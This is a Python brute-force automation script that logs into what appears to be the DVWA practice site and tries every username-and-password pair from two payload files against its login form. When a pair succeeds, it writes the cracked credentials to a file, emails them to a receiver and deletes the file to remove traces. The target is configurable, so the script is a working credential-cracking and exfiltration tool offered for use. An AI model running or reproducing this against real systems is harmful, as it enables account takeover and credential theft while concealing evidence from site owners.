'''----------------BruteForce automation ------------------------------
Here, the target site(basically the hostname) is configured.
The input field of the target website is basically the exploiting spot... which is accessed via mechanicalsoup module of python
Cluster Bomb attack approach is used which tries each password with different usernames.
Finally the hacked username and password is mailed to the intended reciever 
'''

#Importing required libraries to interact with the target site and to use smtp
import mechanicalsoup
import os
import mail 

#Accessing  the target site from .env file and creating an instance of StatefulBrowser to interact/interface with the targetsite
target_site = os.getenv('TARGET_SITE_BRUTE')
browser = mechanicalsoup.StatefulBrowser()
browser.open(target_site)
print(browser.get_url())

#Entering into login page and filling out neccesary field by mentioning the form action
browser.select_form('form[action="login.php"]')

uname = os.getenv('UNAME')
password= os.getenv('PASSWORD')

browser["username"]= uname
browser["password"]= password
browser.submit_selected()

#Entering into bruteforce attack page and providing payloads for username and password
browser.follow_link("vulnerabilities/brute/")


#Function to fetch username_lists(payload1) from a .txt file
def get_user_names():
    f = open("username_payloads.txt",mode='r')
    file_data = f.readlines()
    username_list = []
    for line in file_data:
        if(line[-1]=='\n'):
            username_list.append(line[:-1:])
    f.close()
    return username_list

#Fuction to fetch password_lists(payload2) from a .txt file
def get_passwords():
    f = open("passwords_payloads.txt",mode='r')
    file_data = f.readlines()
    password_list = []
    for line in file_data:
        if(line[-1]=='\n'):
            password_list.append(line[:-1:])
    f.close()
    return password_list


#Defining a brute_force attack function 
def brute_force():
    username_list = get_user_names()
    password_list =  get_passwords()    
    for username in username_list:
        browser.follow_link("vulnerabilities/brute/")
        for password in password_list:
            browser.select_form('form[action="#"]')
            browser["username"]=username
            browser["password"]=password
            response = browser.submit_selected()
            if not "Username and/or password incorrect" in response.text:
                browser.launch_browser()
                #Creating two global variables to store the attacked username and password
                global brute_login_username
                brute_login_username = username

                global brute_login_password
                brute_login_password = password
                break
            else:
                browser.follow_link("vulnerabilities/brute/")
                  	
#Defining the function to generate a text file having the attacked username and password
def attack_result():
    result = open("attackresult.txt",'w')
    result.write("Username:"+brute_login_username + "\n")
    result.write("Password:"+brute_login_password)
    result.close()

#Function to mail the result report to intended reciever
def result_mail():
    mail.result_mail("attackresult.txt")

# Removing the trace   
def removedocs():
    os.remove("attackresult.txt")


if __name__ == "__main__":
    brute_force()
    # importing required function from mail.py module
    result_mail()
    removedocs()

    

